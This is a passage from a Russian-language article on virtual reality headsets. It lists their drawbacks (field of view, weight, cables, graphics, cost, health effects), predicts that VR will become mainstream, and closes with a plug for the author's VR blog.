   ная сетка.
 • То же касается малого угла обзора, из‐за которого появляется «эффект
   водолазной маски».
 • Шлемы обычно тяжелые и, несмотря на все попытки сде лать их эрго‐
   номичнее, не особенно удобны при долгом использовании.
 • К шлемам, которые подклю чаются к ПК, идут провода и, конечно же, меша‐
   ют играть (и тем более ходить).
 • В играх для VR графика всегда будет хуже, чем в обычных, — из‐за необ‐
   ходимости в сверхвысоком раз решении и супербыстром отклике на дви‐
   жения головы. Автономных шлемов это каса ется в особенности.
 • Не устаю напоминать: без мощ ного компьюте ра неавтономный шлем бес‐
   полезен.
 • Цены потихоньку снижаются, но еще довольно кусачие. И за лучшие
  модели приходится переплачивать, либо нужно заказы вать их из‐за
   рубежа и ждать. А иногда ждать, потом заказывать, а потом снова ждать.
 • Продолжительное использование шлема может нанести вред здоровью.


ПОДВОДИМ ИТОГИ
Большая часть сегодняшних проблем с VR в ближайшем будущем так
или иначе будет решена или уже решается. Шлемы дешевеют, экраны ста‐
новятся лучше. Появляются полностью бес проводные устройства вроде Ocu‐
lus Quest, которым не нужен ПК. Гра фика улучшает ся, и сами игры становятся
интереснее. Так или иначе, VR идет в массы, хоть и не так быстро, как этого
ждали.
  А скептикам хочу напом нить, что никто не думал три десятилетия назад,
что так выстрелят компь ютеры, интернет и смартфоны. А теперь мы не можем
представить без них нашу жизнь. Когда‐нибудь и VR будет такой же обыден‐
ностью и у каждого будет свое личное VR‐устрой ство, а то и нес колько,
как это сегодня происхо дит со смартфо нами.


        WWW

                        VR419.ru — мой блог, где я пишу о новостях VR,
                         тестирую и сравниваю разные устройства.